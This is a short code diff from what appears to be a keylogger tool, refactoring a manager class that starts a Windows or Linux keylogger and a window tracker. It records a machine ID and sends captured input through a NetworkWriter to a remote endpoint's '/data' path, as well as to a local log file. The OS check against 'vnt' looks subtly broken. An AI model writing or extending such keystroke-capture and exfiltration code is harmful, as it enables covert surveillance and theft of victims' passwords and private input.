@@ -52,6 +52,20 @@ class DefaultManager:
         log_path: Optional[str] = None,
         push_interval: int = 10,
     ):
+        self.endpoint = endpoint
+        self.log_path = log_path
+        self.interval = push_interval
+        self.processor = Processor("")
+        self.machine_id = self.processor.mac
+
+        # Create the sinks
+        self.sinks = []
+        if log_path:
+            self.sinks.append(FileWriter(log_path))
+        if self.endpoint:
+            self.sinks.append(NetworkWriter(self.endpoint + "/data"))
+
+    def _setup(self):
         # Use WindowsKeylogger if the OS is Windows, otherwise use LinuxKeylogger
         if os.name == "vnt":
             klogger: Listener = WindowsKeylogger()
@@ -68,24 +82,15 @@ class DefaultManager:
                 logger.error("Failed to create the WindowTracker", exc_info=False)
                 self.window_tracker = None
 
-        self.processor = Processor("")
-        self.endpoint = endpoint
-        self.machine_id = self.processor.mac
-
-        self.sinks = []
-        if log_path:
-            self.sinks.append(FileWriter(log_path))
-        if self.endpoint:
-            self.sinks.append(NetworkWriter(self.endpoint + "/data"))
-
         self.listner = klogger
-        self.interval = push_interval
 
         # Create a thread to run the loop
         self._loop_thread = threading.Thread(target=self._loop)
         self._stopped = False
 
     def start(self) -> None:
+        logger.debug("Starting the manager")
+        self._setup()
         self.listner.start()
         if self.window_tracker:
             self.window_tracker.start()
